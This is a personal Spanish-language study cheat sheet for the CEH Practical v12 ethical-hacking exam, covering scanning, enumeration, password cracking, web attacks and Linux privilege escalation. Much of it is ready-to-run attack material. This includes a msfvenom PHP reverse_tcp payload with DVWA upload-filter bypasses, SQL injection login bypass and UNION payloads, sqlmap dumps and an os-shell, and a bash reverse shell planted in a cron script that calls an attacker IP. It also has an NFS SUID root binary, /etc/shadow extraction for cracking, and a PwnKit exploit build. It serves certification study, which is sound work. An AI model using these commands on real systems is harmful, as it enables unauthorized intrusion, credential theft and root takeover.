# MIS NOTAS CEH PRACTICAL V12
## Comandos sistemas operativos
|Windows|Linux|Funcion|
|-------|-----|-------|
|`systeminfo`|`uname -a`| Informacion SO y Kernel Version|    
|`route print`|`route -v`| Tablas de enrutamiento|
|'type [ruta del archivo]'|"cat [ruta del archivo]'| Ver contenido de un archivo| 
|`tasklist`|`ps aux`|Lista de procesos en ejecucion|
|`taskkill /PID [numero PID]`||Finaliza el proceso|
|`/? ; ? `|`-h; --help; -H`|Consulta ayuda en un comando|
|`mkdir`|`mkdir`| Crea directorio|
|`copy [ruta\archivo a copiar] [ruta\archivo de destino]`|`cp`|Copiar archivos o directorios|
|`del`|`rm`| Borrar archivos|
|`rd; rmdir`|`rm -r`| Borrar directorios|
|`netstat -ano`|`netstat -tulna`| Puertos y conexiones establecidas|
|`arp -a`|`arp -n`| Tabla ARP|
|`python -m http.server 8000`|`python -m http.server (o SimpleHTTPServer) 8000`| Crea un servidor de archivos local, preferiblemente hacerlo en linux|
||`wget http://[ip]:8000/ruta_archivo`|Descargar archivo de un servidor|
||`dig @[ip servidor DNS][dominio]`|Consulta si alguien ha entrado a ese dominio a través de ese servidor DNS|
||`dig @NameServerPrimario [dominio] axfr`|Transferencia de zona en LINUX|
|`nslookup --> [ip o dominio] --> set type=[A,AAAA,CNAME,NS,SOA,MX,PTR,SRV]`|Lo mismo|Consultas DNS|
|`nslookup --> server [name server principal del dominio] --> set type=any --> ls -d [dominio]`||||Transferencia de zona en Windows|

**Encontrar archivos en una maquina**

En Windows
```
dir /s C:\Users\[username]\[directorio] [nombre_de_archivo].[extension] /p
```
En Linux
```
find / -name [nombre_archivo].[extension] (Busca en / ese archivo]
find / -name *.[extension] (busca por extension)
find /home -user [username] (encuentra archivos de ese usuario)
find / -atime 10 (encuentra archivos que fueron Accedidos en los ultimos 10 dias)
find / -mtime 10 (encuentra archivos que fueron Modificados en los ultimos 10 dias)
find / -cmin -60 (encuentra archivos que se cambiaron dentro de los ultimos 60 minutos)
find / -amin -60 (encuentra archivos a los que se accedio en los ultimos 60 minutos o MENOS (-)) 
find / -size +50M (encuentra archivos de tamano de 50 MB o mas) (SE PUEDE COLOCAR + O - DELANTE DEL NUMERO PARA INDICAR EL TAMANO)
find / -perm 777 (encuentra archivos con esos permisos)
find / -name python* (encuentra herramientas de desarrollo y lenguajes)
```
## Transferencia de archivos
**Compartir recursos**

En Windows para compartir un archivo, se hace clic derecho> Dar acceso a > Usuarios específicos > Compartir (sin colocar usuarios)

En Linux hay que habilitar el servidor Samba, el cual es una implementación de software libre del protocolo SMB, tambien conocido como Common Internet File System (CIFS)
```
sudo apt-get install samba
sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.backup
sudo pluma /etc/samba/smb.conf
[Nombre para darle a el recurso]
          path = /ruta/al/directorio
          guest ok = yes
          read only = no 
Configurar permisos chmod y chown al directorio, recuerda usar la opción -R (recursiva)
sudo service smbd restart
```
**Acceso a recursos compartidos**

Para acceder a un recurso compartido de una maquina Linux desde una maquina Windows, simplemente se va a Explorador de archivos > Red > 
\\[ip_maquina_linux] . Para esto la maquina Windows debe tener **Centro de Redes y recursos compartidos>Configuracion de uso compartido avanzado>Activar deteccion de red y uso compartido de archivos e impresoras**

Por el lado contrario, para acceder a recursos compartidos de una maquina Windows desde una maquina Linux, hay varias opciones:

1)	**Explorador de archivos** > Red > smb://[ip] NOTA: Cuando el nombre de usuario es un correo electrónico, como en mi caso, la contraseña que se introduce es la contraseña del correo, no la de la maquina.

2)	Por **smbclient**, con los siguientes comandos:
```
smbclient //[ip]/nombre_del_recurso_compartido_o_carpeta -U [usuario]
```
Al introducir ese comando, te pedirá la contraseña para ese usuario, y se abre una línea de comandos smb> en la que puedes consultar el comando help para ver la lista de comandos disponibles, entre los cuales esta por supuesto “ls”, “cd”, “get” y “put”

**NOTA:** Para poder tener acceso es necesario indicar el nombre del recurso compartido, con solo la IP no ingresara, al menos colocar “Users” o algo por el estilo.

En el caso de que los directorios o archivos tengan separación, se debe colocar entre comillas ej: “Hacking ético y ciberseguridad”
```
get [nombre del archivo.extension]
put [nombre del archivo local.extension] [nombre deseado para guardarlo en la maquina remota.extension]
```
Los archivos que se descarguen y se suban, se harán en el directorio en el que se encuentre la parrot ejecutando el smbclient y el directorio de windows donde este abierto el smbclient.
3) Comando **mount** (Copiar archivos o directorios de una maquina Windows desde una Linux)
**Es importante crear una carpeta unicamente para lo que se quiere importar, porque al montar un directorio de esta manera, se borra lo que esta en la ubicacion donde se guarda**
```
mkdir /home/kari/CEH-Tools
showmount -e [ip] (ver cuales carpetas son compartidas en la maquina)
sudo mount --source //[IP Maquina Source]/CEH-Tools --target /home/kari/CEH-Tools -o username=[usuario Maquina Source]

umount [directorio local donde se guardo lo que se quiere desmontar] (vuelve al contenido anterior en caso de que se haya borrado)
```
**Acceso de forma remota**
```
ssh [username]@[ip]
ssh -p [puerto] [username]@[ip]
telnet [IP o nombre] [puerto]

ftp [ip]
cd [directorio]
pwd 
ls
get [nombre del archivo remoto]
put [nombre del archivo local]
delete [nombre del archivo remoto]
rmdir [nombre del directorio remoto]
help [comando]
quit

```
## Scanning and Enumeration (Siempre *sudo su* antes de ejecutarlo)

Escaneo para hosts activos dentro de una red, con **-A** se puede ver el hostname de la maquina: 
-Pn es util cuando los hosts salen inactivos como "host seem be down"
```
nmap -A [ip]
nmap -Pn [ip]
```
Una vez que enumeraste todos los hosts activos en un segmento, en caso de que no lo hayas hecho ya, enumera los servicios y puertos abiertos en cada una de las maquinas que estan activas, puedes pasarle un .txt con las IP, una por linea, con el siguiente comando:
```
nmap -sV -iL [archivo.txt]
```
Descubrimiento de Sistema Operativo:
```
nmap -O [ip]
```
Evasion de Firewall:
```
nmap -f [ip]
nmap -g 80 [ip] (un puerto conocido, 80)
nmap -sT -Pn --spoof-mac 0 [ip] (direccion MAC de origen aleatoria)
```
**SCRIPTS DE NMAP** . Categorias de scripts: all, auth, default, discovery, external, intrusive, malware, safe, vuln.
```
nmap --script-help=[categoria]
nmap --script-help='*palabra clave*'

nmap --script [script.nse] [ip]
nmap --script [categoria] [ip]
```
**Enumeracion SMB**
```
nmap --script smb-os-discovery.nse [ip]
nmap -sU -sS --script smb-enum-users.nse -p U:137, T:139 [ip]
nmap --script smb-enum-users.nse -p 445 [ip]
```
**Enumeracion NetBios**
```
nmap -sV -v --script nbstat.nse [ip]
nbtstat -a [ip] (en CMD despliega la tabla de NetBIOS Name)
enum4linux -u martin -p apple -n [ip] (toda la informacion)
enum4linux -u martin -p apple -P [ip] (informacion de politicas)
```
**Enumeracion SNMP**
```
nmap -sU -p 161 [ip]
snmp-check [ip] (muestra cuentas de usuario, procesos, etc)
```
**Enumeracion MySQL**
```
nmap --script mysql-info [ip]
nmap --script mysql-enum [ip]
```
**Enumera sitio web**
```
nmap -sV --script=http-enum [www.dominio.com]
```
## Steganography
Nota: El archivo a descifrar debe estar en la **misma** carpeta que snow.exe
```
snow -C -m "[mensaje que se quiere colocar]" -p "[password]" [archivo que se va a mostrar] [archivo que tiene el mensaje oculto]
snow -C -p "[password]" [archivo que se quiere decodificar]
Openstego --> Para imagenes
```
## FQDN
FQDN = HOSTNAME + DOMINIO + DOMINIO DE NIVEL SUPERIOR
```
ENCONTRAR FQDN EN LA PROPIA COMPUTADORA:
echo %COMPUTERNAME%.%USERDNSDOMAIN% (en Windows)
hostname --fqdn (en Linux)
nmap -p 389 –sV [ip red] -Pn (encuentra que host en una subred tiene LDAP activo)
nmap -A -T4 -v [ip] (normalmente con este comando y el de arriba, debe salir en "service info" en nmap el nombre de host y de dominio.
nmap -p 389 --script ldap-brute --script-args '"cn=users,dc=[dominio],dc=com"' [ip] (enumerar LDAP) 

nltest /DSGETDC:[dominio] (para cuando la maquina Windows esta en la misma red del AD, sin importar que la maquina no este en el mismo dominio)
```
## Wireshark
Identifica al atacante. Nota: Cuando es un DDoS recuerda que son varias maquinas involucradas en el ataque.
```
statistics IPV4 addresses --> Source and Destination Addresses --> Apply Filter -->
tcp.flags.syn == 1 and tcp.flags.ack == 0 (La IP del atacante normalmente tiene minimo 4000 paquetes enviados, es la IP Source con mas paquetes enviados)
tcp.flags.syn == 1 (El total de maquinas atacadas es la cantidad de maquinas con mayor cantidad de paquetes recibidos)

http.request.method == POST (Una vez que tienes el Request se da clic en el y se busca el username o password,  tambien se tiene la opcion de dar Clic derecho > Follow > TCP Stream para ver el Request como se veria por ejemplo en BurpSuite)
```
## Hacking Wireless Networks
```
aircrack-ng [pcap file] (Crack the WEP Key)
aircrack-ng [WPA2 pcap file] (te dice el BSSID) 
aircrack-ng -a2 -b [Target BSSID] -w [password_wordlist.txt] [WPA2 pcap file]

Para identificar el BSSID primero se intenta con el comando de arriba, si no lo arroja, se abre Wireshark --> Columna Info dice "Probe response" --> Se selecciona el paquete --> Categoria IEEE 802.11 Probe Response --> MAC de Source Address (BSSID)
```
## Criptography
Para **generar HASH de archivos** --> hashcalc (Windows)

Para **desencriptar archivos** --> Cryptool (Windows, si no mencionan el Key length se presiona directamente decrypt, recuerda al buscar el archivo que este seleccionada en la ventana la opcion All Files (.*)) Posibles algoritmos: RC4 Key Length 8 bits hexadecimales en 14 y DES(ECB)

Para convertir a texto plano un hash, simplemente se copia el contenido del archivo y se pega en --> hashes.com o crackstation.net

**Hashcat** Cuando no se sabe el tipo de hash, simplemente no se especifica.
```
hashcat -a 0 [archivo_hash_a_crackear] [wordlist_hashes, puede ser rockyou]
```
**Veracrypt** Cuando se debe desencriptar un Volume File. El password para montar en el disco puede estar hasheado.

**BCTextEncoder**: Se copia el contenido del archivo y se decodifica usando el password que dan.

**John The Ripper**
```
john --wordlist=[ruta_wordlist_password] [archivo_hash_a_crackear]
```
## Hacking Android/Mobile
```
nmap -sV -p 5555 [ip red]
sudo apt-get install android-tools-adb (por si no esta instalado)
adb connect [ip]:5555
adb root
adb shell
pwd
ls
```
Recuerda que en adb se pueden usar los comandos cat, cd, ls, find.

Para copiar una carpeta a la maquina:
```
exit (salir de la shell)
adb pull [ruta completa de la carpeta que se quiere copiar]
```
Herramienta para determinar la entropia de un archivo:
```
apt-get install ent
ent [nombre de archivo.extension]
```
Generador de hash Sha384
```
sha384sum [archivo]
```
Los mensajes de texto se encuentran por lo general en la base de datos **mmssms.db** (/data/data/com.android.providers/telephony/database/mmssms.db
/data/data/com.android.providers.telephony/database/mmssms.db
/data/user_de/0/com.android.providers.telephony/databases/mmssms.db) :
```
adb root
adb shell
find / -name "mmssms.db"
exit
adb pull [ruta completa del archivo]

chmod +x mmssms.db
sqlite3 mmssms.db
.tables (muestra todas las tablas)
SELECT * FROM sms;
SELECT * FROM sms WHERE read=0;
SELECT * FROM sms WHERE read=1;
```
## Malware Analysis
Escanear archivos: Hybrid analysis (https://www.hybrid-analysis.com), Virus total (https://www.virustotal.com/gui/home/upload)  

Para detectar empaquetamientos y ofuscacion: **PEiD**

Para EntryPoint, hash, entropia, etc: **DIE** --> Subir el archivo, escanear, y darle a "Advanced" --> Cambiar el file type hasta que coincida con el patron. 

Para PE, section headers: **PE Explorer**
## Hacking Web Applications
wpscan NOTA: --random-user-agent: Permite evadir WAF
```
wpscan --url [http:example.com:8080/Directorio] 
wpscan --url [http:example.com:8080/Directorio] -e u (enumerar usuarios)

wpscan --url [http:example.com:8080/Directorio] --usernames [usernamelist.txt] --passwords passwordlist.txt 
wpscan --url [http:example.com:8080/Directorio] -u [username] --passwords passwordlist.txt (si no permite -u, haz un .txt con el unico usuario)
```
Si no funciona wpscan, se usa **Metasploit**
```
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
show options
set TARGETURI https://dhabal.com/wp-login.php
set RHOSTS https://dhabal.com
set RPORT 443
set USER_FILE [wordlist de usernames]
set PASS_FILE [wordlist de passwords]
```
Crack credentials with **Hydra**
```
hydra -l [username] -P [wordlist de passwords.txt] ftp://[ip]
hydra -L [wordlists de usernames.txt] -P [wordlist de passwords.txt] ftp://[ip]
hydra -L [wordlists de usernames.txt] -P [wordlist de passwords.txt] -vV [IP] [servicio, por ejemplo ssh, telnet, smb]

Si el servicio no esta ejecutandose en el puerto por defecto, se usa -s:
hydra -L [wordlists de usernames.txt] -P [wordlist de passwords.txt] ftp://[ip] -s [puerto]

alternativa: medusa -h [ip] -U [wordlist de usuarios] -p [wordlist de passwords] -M ftp -F
```
Crawling y escaneo de vulnerabilidades web --> **OWASP ZAP**

**dirb** para enumerar directorios de forma recursiva, asegurate de que en el archivo de wordlist este incluido el nombre del archivo (con su extension) que tienes que encontrar.
```
dirb http://training.cehorg.com /usr/share/dirb/wordlists/common.txt -w

ALTERNATIVA: gobuster dir -u [dominio o ip] -w [wordlist] 
```
Ver cabeceras HTTP. Por ejemplo X-Powered-By para tecnologias de desarrollo
```
telnet [dominio] [puerto (80 ej)]
```
File upload en DVWA
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f raw
pluma upload.php (se pega el payload generado)

Para abrir el reverse tcp luego de subir el archivo:

msfvenom use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST [ip]
set LPORT 4444
run

(Para que pueda abrirse la shell reversa es necesario visitar la URL del archivo)

En nivel MEDIO se hace el mismo procedimiento, a diferencia de que se crea un archivo en pluma con la extension.php.jpg. Al momento de subirlo a DVWA se intercepta con burpsuite y se elimina la extension .jpg.

En nivel ALTO se hace el mismo procedimiento pero se guarda el archivo pluma como .jpeg y se agrega en la primera linea GIF98, luego en la seccion de Command Injection de DVWA se coloca: | copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php (simplemente se copia el archivo cambiandole el nombre y extension) 
```
## SQLi
**Authentication Bypass**
```
'-- (en el campo de usuario y se coloca cualquier cosa en contrasena)
[cualquier username]' OR 1=1-- 
```
IDOR --> Luego del authentication bypass o del login, ir iterando hasta conseguir el dato solicitado.
**SQLmap**
```
En "Inspeccionar" en el navegador, en la pestana "Console" se escribe document.cookie
Ahora se ejecuta SQLmap con esa cookie:

CHEQUEA LA BASE DE DATOS
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --dbs

CHEQUEA LAS TABLAS DE LA BASE DE DATOS
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] --tables

CHEQUEA LAS COLUMNAS DE LA TABLA
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --columns

DUMPEAR TODOS LOS VALORES DE LA TABLA
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --dump

PARA OBTENER LA OS SHELL
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --os-shell
```
**Manual**

Cuando la solicitud se refleja en la respuesta del sitio web, se puede utilizar la palabra clave UNION SELECT. Para que un ataque UNION pueda funcionar, primero se debe determinar la cantidad de columnas y cada columna debe coincidir con el tipo de dato que se esta solicitando. 

Comentarios en las diferentes bases de datos:

'#' Sin las comillas **>** PostreSQL

-- - **>** MySQL y Microsoft
```
'UNION SELECT null, null
'UNION SELECT null, null FROM dual-- (en Oracle)

Identificar nombres de las bases de datos
' UNION SELECT schema_name, null FROM information_schema.schemata
group_concat(schema_name) from information_schema.schemata

Enlistar los nombres de todas las tablas de una base de datos
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='nombre de la base de datos'

Enlistar nombres de todas las columnas de una tabla
'UNION SELECT column_name, null from information_schema.columns WHERE table_schema='nombre de la base de datos' AND table_name='nombre de la tabla'--

Leer contenido de la columna
'UNION SELECT campo1,campo2 FROM nombre de la tabla--
```
## Privilege Escalation
Recuerda: Usuario + contrasena + IP --> SSH
```
nmap -sV -p 22 [ip red]
ssh [username]@[ip]
```
Aqui hay que intentar primero lo mas sencillo, lo comun, recuerda utilizar siempre la opcion ls -la para mostrar archivos ocultos (por si acaso)

```
whoami
id (niveles de privilegios)
sudo -l (ver que comandos puede ejecutar el usuario con el comando sudo, y los binarios que se pueden ejecutar como root sin password)
ps -A (ve todos los procesos en ejecucion)
cat /etc/passwd | grep home (ver los usuarios disponibles en la maquina)
```
**Kernel Exploit**
```
uname -a (la version del Kernel es la primera version que sale en la salida del comando)
Se busca algún CVE, con exploit (exploit-db). Recomendación: https://www.linuxkernelcves.com/cves
gcc [archivo_exploit_descarga.c] -o [archivo salida_sin_extension] (compila el exploit, que es un programa en C)
./[archivo salida_sin_extension]
id (se verifica la escalada de privilegios)
```
**sudo**
```
sudo -l
sudo nano (si esta dentro de los binarios permitidos de ejecutar como root sin psswd)
CTRL+R 
CTRL+X
reset; sh 1>&0 2>&0
MIENTRAS SE EJECUTA ESE COMANDO EN NANO SE BUSCAN LOS HASHES de los usuarios
cat /etc/shadow
```
**Crackear contrasenas de usuarios en la maquina**
Esto se podria hacer con algun binario que se pueda ejecutar como root ya sea porque esta en sudo -l o tiene el bit SUID activo
```
nano /etc/shadow > shadow.txt
nano /etc/passwd > passwd.txt
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=[wordlist como rockyou] passwords.txt
```
**Bit SUID:** Se ejecuta el binario con los privilegios del usuario propietario
https://gtfobins.github.io
```
find / -type f -perm -04000 -ls 2>/dev/null (Enlista archivos que tienen los bits SUID y SGID activos)

base64 /etc/passwd | base64 --decode (si base64 aparece con el bit suid activo, este comando permite visualizar el archivo)
```
**Capabilities**
```
getpcap -r / 2>/dev/null (este comando permite ver las capacidades almacenadas en un archivo o directorio, en este caso en el directorio /)
Se busca en gtfo algun exploit para capabilities en un binario
```
**CRON JOBS**
```
cat /etc/crontab (VER SCRIPTS QUE SE ESTEN EJECUTANDO, EL QUE PUEDA VER O MODIFICAR ES ESE)
cat [script]
nano [script]
SE COLOCA ESTO EN EL SCRIPT PARA ABRIR UNA REVERSE SHELL A LA MAQUINA DEL ATACANTE:
#!/bin/bash
bash -i >& /dev/tcp/[IP_ATACANTE o 127.0.0.1]/6666 0>&1

chmod +x backup.sh

EN LA MAQUINA DEL ATACANTE:

nc -nlvp 6666

(SE ABRE LA REVERSE SHELL, para hacer el mismo proceso de cracking de contrasenas para el usuario, /etc/passwd y /etc/shadow )
```
**NFS**
Si la opción "no_root_squash" está presente en un recurso compartido con permisos de escritura, podemos crear un ejecutable con el bit SUID activado y ejecutarlo en el sistema de destino.
```
EN LA MAQUINA VICTIMA:
sudo apt install nfs-kernel-server (se instala, si no esta)
sudo /etc/exports -->
/home *(rw, no_root_squash)
sudo /etc/init.d/nfs-kernel-server restart

cat /etc/exports (IDENTIFICAR LAS CARPETAS COMPARTIDAS WRITABLE Y "no_root_squash"

EN LA MAQUINA LOCAL:

showmount -e [ip victima] (veo cuales son las carpetas compartidas donde se pueden montar archivos)
mkdir [directorio que se va a montar en la maquina]
mount -o rw [ip victima]:/[carpeta compartida de la victima] [carpeta que se va a montar]
cd [carpeta montada]
pluma nfs.c 

CONTENIDO DEL ARCHIVO nfs.c:

int main ()
{  setgid(0);
   setuid(0);
   system("/bin/bash");
   return(0);
}

gcc nfs.c -o nfs -w (se compila)
chmod +s nfs (se le da el bit SUID)


MAQUINA VICTIMA:
cd [carpeta montada]
./nfs (SE EJECUTA EL SCRIPT, Y WE AREEE ROOT!!!)
```
Vulnerabilidad **PoC Pkexec**
```
mkdir /tmp/pwnkit
git clone https://github.com/berdav/CVE-2021-4034.git
cp -r CVE-2021-4034 /tmp/pwnkit
cd /tmp/pwnkit
make
./cve-2021-4034
```
